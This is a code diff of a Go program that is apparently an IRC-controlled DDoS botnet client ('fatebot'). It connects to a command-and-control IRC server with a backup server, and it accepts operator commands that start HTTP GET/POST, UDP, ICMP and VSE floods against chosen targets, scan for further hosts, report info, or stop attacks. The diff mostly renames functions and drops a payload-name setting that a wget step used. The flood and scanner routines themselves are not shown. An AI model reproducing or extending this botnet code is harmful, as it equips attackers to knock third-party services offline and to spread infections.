@@ -16,27 +16,26 @@ var (
 	IRC_Channel       = "" //config channel here. //"#Example"
 	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
 	IRC_USNM          = "" //config your IRC username here. //For acces to your bot commands.
-	New_Payload_Name  = "" //config new payload name. //For wget process.
 )
 
 type reader struct {
 	read string
 }
 
-func (read *reader) botAccess() bool {
-	return pkg.IRCfind(pkg.IRCrecv(read.read, 0), IRC_USNM)
+func (read *reader) permission() bool {
+	return pkg.Find(pkg.Recv(read.read, 0), IRC_USNM)
 }
 
-func bot(server string) error {
-	conn := pkg.IRCconn(server)
+func fatebot(server string) error {
+	conn := pkg.Conn(server)
 	tp := textproto.NewReader(bufio.NewReader(conn))
 
-	irc := &pkg.IRC{
-		Report:  conn,
+	bot := &pkg.BOT{
+		IRC:     conn,
 		Channel: IRC_Channel,
 		ChanKey: IRC_Chan_Password,
 	}
-	irc.IRClogin()
+	bot.Login()
 
 	for {
 		ircRead, err := tp.ReadLine()
@@ -48,58 +47,58 @@ func bot(server string) error {
 		}
 
 		go func() {
-			if pkg.IRCfind(ircRead, "PING :") {
-				irc.IRCsend("PONG " + pkg.IRCrecv(ircRead, 1))
+			if pkg.Find(ircRead, "PING :") {
+				bot.Send("PONG " + pkg.Recv(ircRead, 1))
 			}
 		}()
 
 		//Check is user modes and Join IRC channel
-		if pkg.IRCfind(ircRead, "+i") || pkg.IRCfind(ircRead, "+w") || pkg.IRCfind(ircRead, "+x") {
-			irc.IRCsend(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
+		if pkg.Find(ircRead, "+i") || pkg.Find(ircRead, "+w") || pkg.Find(ircRead, "+x") {
+			bot.Send(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
 		}
 
 		go func() {
 			switch {
-			case pkg.IRCfind(ircRead, "?get") && read.botAccess():
+			case pkg.Find(ircRead, "?get") && read.permission():
 				pkg.AttackSwitch = false
-				go irc.GET(pkg.IRCrecv(ircRead, 4))
-				irc.IRCreport("START HTTP GET FLOOD TO: " +
-					pkg.IRCrecv(ircRead, 4))
-			case pkg.IRCfind(ircRead, "?post") && read.botAccess():
+				go bot.GET(pkg.Recv(ircRead, 4))
+				bot.Report("START HTTP GET FLOOD TO: " +
+					pkg.Recv(ircRead, 4))
+			case pkg.Find(ircRead, "?post") && read.permission():
 				pkg.AttackSwitch = false
-				go irc.POST(pkg.IRCrecv(ircRead, 4))
-				irc.IRCreport("START HTTP POST FLOOD TO: " +
-					pkg.IRCrecv(ircRead, 4))
-			case pkg.IRCfind(ircRead, "?udp") && read.botAccess():
+				go bot.POST(pkg.Recv(ircRead, 4))
+				bot.Report("START HTTP POST FLOOD TO: " +
+					pkg.Recv(ircRead, 4))
+			case pkg.Find(ircRead, "?udp") && read.permission():
 				pkg.AttackSwitch = false
-				go irc.DUDP(pkg.IRCrecv(ircRead, 4),
-					pkg.IRCrecv(ircRead, 5))
-				irc.IRCreport("START UDP FLOOD TO: " +
-					pkg.IRCrecv(ircRead, 4))
-			case pkg.IRCfind(ircRead, "?icmp") && read.botAccess():
+				go bot.DUDP(pkg.Recv(ircRead, 4),
+					pkg.Recv(ircRead, 5))
+				bot.Report("START UDP FLOOD TO: " +
+					pkg.Recv(ircRead, 4))
+			case pkg.Find(ircRead, "?icmp") && read.permission():
 				pkg.AttackSwitch = false
-				go irc.ICMP(pkg.IRCrecv(ircRead, 4))
-				irc.IRCreport("START ICMP FLOOD TO: " +
-					pkg.IRCrecv(ircRead, 4))
-			case pkg.IRCfind(ircRead, "?vse") && read.botAccess():
+				go bot.ICMP(pkg.Recv(ircRead, 4))
+				bot.Report("START ICMP FLOOD TO: " +
+					pkg.Recv(ircRead, 4))
+			case pkg.Find(ircRead, "?vse") && read.permission():
 				pkg.AttackSwitch = false
-				go irc.VSE(pkg.IRCrecv(ircRead, 4))
-				irc.IRCreport("START VSE FLOOD TO: " +
-					pkg.IRCrecv(ircRead, 4))
-			case pkg.IRCfind(ircRead, "?scan") && read.botAccess():
-				go irc.ScanMode(pkg.IRCrecv(ircRead, 4),
-					pkg.IRCrecv(ircRead, 5), New_Payload_Name)
-				irc.IRCreport("START SCANNING.")
-			case pkg.IRCfind(ircRead, "?info") && read.botAccess():
-				irc.ReportInfo()
-			case pkg.IRCfind(ircRead, "?kill") && read.botAccess():
+				go bot.VSE(pkg.Recv(ircRead, 4))
+				bot.Report("START VSE FLOOD TO: " +
+					pkg.Recv(ircRead, 4))
+			case pkg.Find(ircRead, "?scan") && read.permission():
+				go bot.ScanMode(pkg.Recv(ircRead, 4),
+					pkg.Recv(ircRead, 5))
+				bot.Report("START SCANNING.")
+			case pkg.Find(ircRead, "?info") && read.permission():
+				bot.ReportInfo()
+			case pkg.Find(ircRead, "?kill") && read.permission():
 				os.Exit(0)
-			case pkg.IRCfind(ircRead, "?stopddos") && read.botAccess():
+			case pkg.Find(ircRead, "?stopddos") && read.permission():
 				pkg.AttackSwitch = true
-				irc.IRCreport("STOP ATTACKING.")
-			case pkg.IRCfind(ircRead, "?stopscan") && read.botAccess():
+				bot.Report("STOP ATTACKING.")
+			case pkg.Find(ircRead, "?stopscan") && read.permission():
 				pkg.ScanSwitch = true
-				irc.IRCreport("STOP SCANNING.")
+				bot.Report("STOP SCANNING.")
 			}
 		}()
 	}
@@ -111,9 +110,9 @@ func main() {
 		os.Exit(0)
 	}
 
-	if bot(IRC_Server) != nil {
+	if fatebot(IRC_Server) != nil {
 		for {
-			if bot(IRC_Backup_Server) == nil {
+			if fatebot(IRC_Backup_Server) == nil {
 				break
 			}
 		}
